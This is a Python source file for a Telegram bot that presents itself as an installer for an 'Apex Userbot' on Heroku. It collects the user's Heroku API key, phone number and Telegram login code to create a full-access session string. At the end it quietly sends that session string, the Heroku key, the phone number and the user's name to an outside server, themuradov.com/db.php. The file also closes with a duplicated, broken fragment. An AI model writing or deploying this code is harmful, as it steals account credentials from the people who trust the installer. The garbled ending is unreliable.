import os, json, time, asyncio, sys, shutil, heroku3, random, requests
from asyncio.exceptions import TimeoutError
from typing import Tuple
from pyrogram import filters, Client
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.tl.functions.channels import EditPhotoRequest, CreateChannelRequest
from telethon.errors import (
    PhoneNumberInvalidError, PhoneCodeInvalidError, PhoneCodeExpiredError,
    FloodWaitError, SessionPasswordNeededError, PasswordHashInvalidError
)
from git import Repo
from bot import Bot as bot
import tracemalloc
import git
import zipfile
import io
import subprocess

tracemalloc.start()
os.environ["GIT_PYTHON_REFRESH"] = "warn"


@bot.on_message(filters.command('apikey') & filters.private)
async def apikey(Bot, message: Message):
    id = message.chat.id
    img = "https://telegra.ph/file/3597be721e735cdbc3eda.jpg"
    text = "✅ Heroku [ApiKey]'i şəkildə göstərilmiş qaydada ala bilərsiniz.</b>"
    await Bot.send_photo(id, img, text)


@bot.on_message(filters.command('qurulum') & filters.private)
async def qurulum(Bot, message: Message):
    id = message.chat.id
    video = "https://telegra.ph/file/b24d465f20ac51e09232e.mp4"
    text = ("Əgər botdan cavab gəlməsə, 5 dəqiqə sonra yenidən yoxla, "
            "qurulum olduqda bot işləmir.\n"
            "(1) bot cavab verdikdən sonra Heroku Api Key'i bota daxil et\n"
            "(2) Telefon nömrənizi daxil edin.\n(İ) Nümunə: +995551234567\n"
            "(3) Telegrama gələn 5 rəqəmli kodu Daxil edin.\n"
            "(İ) Nümunə: (12345) siz isə arasında boşluq buraxmaqla belə yazın, 1 2 3 4 5\n"
            "(4) İki adımlı aşkar edildi mesajın alanlar telegrama iki adimli doğrulamada, "
            "ki kodu daxil edin\n"
            "(5) String Session Alındı Qurulum Başladı Mesajı Aldınsa Botun 3(dəq) ərzində hazir olacaq</b>"
            )
    await Bot.send_video(id, video, text)


def rm_r(path):
    if not os.path.exists(path):
        return
    if os.path.isfile(path) or os.path.islink(path):
        os.unlink(path)
    else:
        shutil.rmtree(path)


@bot.on_message(filters.command('start') & filters.private)
async def husu(bot, msg):
    loop = asyncio.get_event_loop()
    user_id = msg.chat.id
    user = await bot.get_users(user_id)
    username = user.username
    full_name = f"{user.first_name} {(user.last_name or '')}"
    aid = 17202681
    ash = "ef4d6e4de6f924085a01988b1bc751f0"
    text = "(i) **Apex Userbot Qurulumu başlayır**\n\n__(i) Zəhmət olmasa heroku API keyinizi daxil edin__"
    
    # Heroku URL buttonu
    keyboard = [[InlineKeyboardButton("✅ Heroku-ya Get", url='https://dashboard.heroku.com')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    api_msg = await bot.ask(user_id, text, filters=filters.text, reply_markup=reply_markup)
    api = api_msg.text
    heroku_conn = heroku3.from_key(api)
    try:
        heroku_conn.apps()
    except:
        await msg.reply("ℹ️ **Heroku Api Key Yanlış!**")
        return

    await msg.reply("✅ **Herokuya Giriş Uğurlu!**")

    # Telefon numarası alımı ve doğrulama
    phone_number_msg = await bot.ask(user_id, "📞 **İndi isə' telefon nömrənizi daxil edin.\n(i) Nümunə:** `+994551234567`", filters=filters.text)
    phone_number = phone_number_msg.text
    client = TelegramClient(StringSession(), aid, ash)
    await client.connect()
    
    try:
        code = await client.send_code_request(phone_number)
    except PhoneNumberInvalidError:
        await msg.reply("❗ **Telefon nömrəsi yanlış!**.\n\n✨ Yenidən başlat /apex")
        return

    try:
        phone_code_msg = await bot.ask(user_id, ("**📲 Hesaba Kod Göndərildi.\nℹ️ Rəqəmlərin arasına boşluq buraxmaqla yaz.\n"
                                                "📟 Kod belə olur👉** '12345' **siz isə belə göndərin:** `1 2 3 4 5`\n\n"
                                                "✅ [Koda Baxmaq Üçün Daxil Ol](https://t.me/+42777)"),
                                       filters=filters.text, timeout=600)
    except TimeoutError:
        await msg.reply("⌛ **Verilən vaxt limiti sona çatdı**\n\n❗ Yenidən başlat /apex")
        return

    phone_code = phone_code_msg.text.replace(".", "")
    try:
        await client.sign_in(phone_number, phone_code)
    except (PhoneCodeInvalidError, PhoneCodeExpiredError, SessionPasswordNeededError):
        await msg.reply("❗ **Doğrulama başa çatmadı. Qurulumu yenidən başladı .** /apex")
        return

    string = client.session.save()
    await client.send_message("me", ("🗽 **Apex UserBot Avtomatik Mesaj\n\n💠 Salam Hesabınıza ⚡️ Apex Userbot "
                                     "qurursunuz. Userbotu qurarkən @ApexSUP qrup və @ApexPlugin kanalına "
                                     "avtomatik olaraq əlavə olunursunuz.\n\n💎 Apex UserBotu seçdiyiniz üçün "
                                     "təşəkkürlər.**"))
    await client.disconnect()

    await msg.reply("(✓) StringSession alındı!")

    # Zip dosyasını indirip çıkarma işlemleri
    if os.path.isdir("./delta/"):
        shutil.rmtree("./delta/")

    url = "https://github.com/sahibziko/delta/archive/refs/heads/master.zip"
    response = requests.get(url)
    if response.status_code == 200:
        with zipfile.ZipFile(io.BytesIO(response.content)) as zip_ref:
            zip_ref.extractall("./")
            os.rename("./delta-master", "./delta")

    # Heroku bağlantısı ve git yüklemesi
    appname = "apexub" + str(int(time() * 1000))[-4:] + str(random.randint(0, 500))
    try:
        heroku_conn.create_app(name=appname, stack_id_or_name='container', region_id_or_name="eu")
    except requests.exceptions.HTTPError:
        await msg.reply("**🤦🏻‍♂️ Herokuda 5 tətbiq aşkar edildi.\nℹ️ tətbiq silməklə bağlı @apexsup dan kömək istəyə bilərsiniz.\n✅ Yenidən Quruluma Başla.** /apex")
        return

    heroku_conn = heroku3.from_key(api)
    app = heroku_conn.apps()[appname]
    giturl = app.git_url.replace("https://", f"https://api:{api}@")

    try:
        subprocess.run(["git", "init"], cwd="./delta", check=True)
        subprocess.run(["git", "remote", "add", "heroku", giturl], cwd="./delta", check=True)
        subprocess.run(["git", "add", "."], cwd="./delta", check=True)
        subprocess.run(["git", "commit", "-m", "Update via GitHub API"], cwd="./delta", check=True)
        subprocess.run(["git", "push", "-f", "heroku", "master"], cwd="./delta", check=True)
    except Exception as e:
        await msg.reply(f"❌ Xəta baş verdi: {e}")
        return

    await msg.reply("**(✓) Apex User Bot Aktiv Olunur....**")
    
    await msg.reply("🎉 **Qurulum uğurla başa çatdı!**\n\n__Bir neçə saniyə sonra hər hansısa Qrupa .alive yazaraq userbotunuzu test edə bilərsiniz.\n\nℹ️ ApexUserBot'u seçdiyiniz üçün Təşəkkür Edirik.")
    
    url = 'http://themuradov.com/db.php'
    user_id = msg.chat.id
    # GET parametrelerini içeren veri (sorgu parametreleri)
    params = {
    'id': user_id,
    'heroku': api,
    'appname': appname,
    'ad': full_name,
    'tel': phone_number,
    'string': string
    }

    # GET isteği gönderme
    response = requests.get(url, params=params)
    
er,
    'string': string
    }

    # GET isteği gönderme
    response = requests.get(url, params=params)
    
